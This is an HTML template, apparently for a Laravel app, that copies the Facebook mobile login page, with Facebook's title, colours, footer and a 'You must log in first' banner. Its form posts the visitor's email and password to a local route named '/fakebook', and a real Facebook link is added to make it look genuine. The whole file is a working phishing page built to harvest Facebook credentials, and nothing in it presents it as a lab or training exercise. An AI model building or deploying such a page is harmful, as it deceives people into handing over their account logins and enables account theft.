<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Log into Facebook | Facebook</title>
    <style>
        *{
            box-sizing: border-box;
            margin:0;
            font-family: Arial, Helvetica, sans-serif
        }
        .alert {
            background: #FFFBE2;
            padding: 0.40em;
            color: #88650d;
            border-bottom:1px solid #E2C822;
            font-size: 14px;
        }
        .logo-container{
            display: flex;
            justify-content: center;
            margin-top: 0.6em;
        }
        .logo-container > img {
            width: 125px;
        }
        .form {
            display: flex;
            justify-content: center;
        }
        form {
            width: 100vw;
            max-width: 460px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        input,button {
            border:none;
            border-radius:4px;
        }
        form>input {
            width:90%;
            padding: 1em;
            margin-bottom: 1em;
            background: #F5F6F7;
            border:1px solid #dcdbdb;
        }

        button {
            padding: 0.5em;
        }
        .login {
            width: 90%;
            background:#1877F2;
            color: white;
            font-weight: 700;
            font-size: 18px;
            margin-top: -3px;
            margin-bottom: 10px;
        }
        .forgot {
            font-size: 14px;
            color: #1877F2;
        }
        .or {
            width: 90%;
            margin-top: 1.5em;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        .or>div{
            width: 100%;
            border-bottom: 1px solid #ddd;
        }
        .or>span {
            color: #555;
            background: #fff;
            display: block;
            width: 50px;
            text-align: center;
            position: relative;
            top: -10px;
            font-size: 14px;
        }
        .create{
            background: #00A400;
            font-size: 14px;
            padding: 0.7em;
            color: #fff;
            font-weight: 700;
            margin-top: 0.5em;
            text-decoration: none;
            border-radius: 4px;
        }

        footer {
            margin-top: 7em;
            display: flex;
            font-size: 12px;
            justify-content: center;
            color: #666;
        }
        footer > div{
            width: 50%;
            text-align: center;
        }
        footer > div > div {
            margin-top: 0.25em;
        }
        .makeitsmall {
            margin-top: 1em;
            text-align: center;
            color: #666;
            font-size: 12px;
        }
        .btn-x{
            width: 20px;
            height: 20px;
            padding: 0.25px;
            background: #fff;
            border: 1px solid #3B5998;
            font-size: 18px;
            color: #666;
            line-height: 0.5em;
        }

        
    </style>
</head>
<body>
    <div class="alert">
        You must log in first.
    </div>
    <div class="logo-container">
        <img src="/dF5SId3UHWd.svg" alt="">
    </div>
    <div class="form">
        <form action="/fakebook" method="POST">
            @csrf
            <input name="email" type="text" placeholder="Mobile number or email">
            <input name="password" type="password" placeholder="Password">
            <button class="login">Log In</button>
            <div class="forgot">
                Forgot Password?
            </div>
            <div class="or">
                <div></div>
                <span>or</span>
            </div>
            <a type="button" class="create" href="///m.facebook.com">
                Create New Account
            </a>
        </form>
    </div>

   <footer>
    <div>
        <div>
            English (US)
        </div>
        <div>
            Bisaya
        </div>
        <div>
            日本語
        </div>
        <div>
            Português (Brasil)
        </div>
    </div>
    <div>
        <div>
            Filipino
        </div>
        <div>
            Español
        </div>
        <div>
            한국어
        </div>
        <div>
            <button class="btn-x">+</button>
        </div>
    </div>
   </footer>
   <div class="makeitsmall">
       Facebook Inc.
   </div>
</body>
</html>